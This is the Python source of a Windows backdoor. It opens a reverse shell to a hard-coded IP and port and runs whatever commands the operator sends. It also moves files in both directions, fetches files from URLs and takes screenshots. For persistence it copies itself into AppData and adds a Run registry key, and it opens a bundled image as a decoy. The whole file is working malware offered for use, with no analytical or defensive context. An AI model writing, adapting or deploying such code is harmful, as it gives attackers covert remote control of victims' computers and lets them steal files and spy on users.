#!/usr/bin/python
import socket, subprocess, json, time, os, shutil, sys, base64, requests, ctypes
from mss import mss


def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
	except:
		admin = "User Privilleges"
	else:
		admin = "Admin privilleges"
		
	
	
def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data)
	
	
def reliable_receive():
	json_data = ""
	while True:
		try: 
			json_data = json_data + sock.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue  
def screenshot():
	with mss() as screenshot:
		screenshot.shot()
		
			
def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)
		

#Connecting to target device			
def connection():
	 while True:
	 	#Reconnect after 20 seconds 
	 	time.sleep(20)
	 	try:
	 		sock.connect(("192.168.43.23",54321))
	 		shell()
	 	except:
	 		connection()

#Function to execute the shell/reverse shell
def shell():
	while True:
		command =  reliable_receive()
		print(command)
		if command == "q":
			break
			
		elif command =='help':
			help_options = '''
			download - Download file from target PC.
			upload - Upload file to the target PC.
			get url - download file from specified url.
			start programme - start a program.
			check - check the privilleges available.
			screenshot - Take a screenshot of the target PC page.
			Other windows CMD commands. 
			
			'''
			reliable_send(help_options)
		#Change directory 
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		#Download command
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
				#
				
		elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				result = reliable_receive()
				fin.write(base64.b64decode(result))
				
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Downloaded file from specified URL")
				
			except:
				reliable_send("Failed to download file")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send(" started successfully")
			except:
				reliable_send("Failed to start ")
				
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png", "rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("Failed to take a screenshot")
		elif command[:5] == 'check':
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Cant perform check")
										
					
		else:
			try: 
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read() 
				reliable_send(result)
			except:
				reliable_send("Cant execute that command")
				
				
#adding persistence
location = os.environ["appdata"] + "\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
	
	#Steganography
	name = sys._MEIPASS + "\corsod.png"
	try:
		subprocess.Popen(name, shell=True)
	except:
		n = 3 
		product = n * n
	
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close()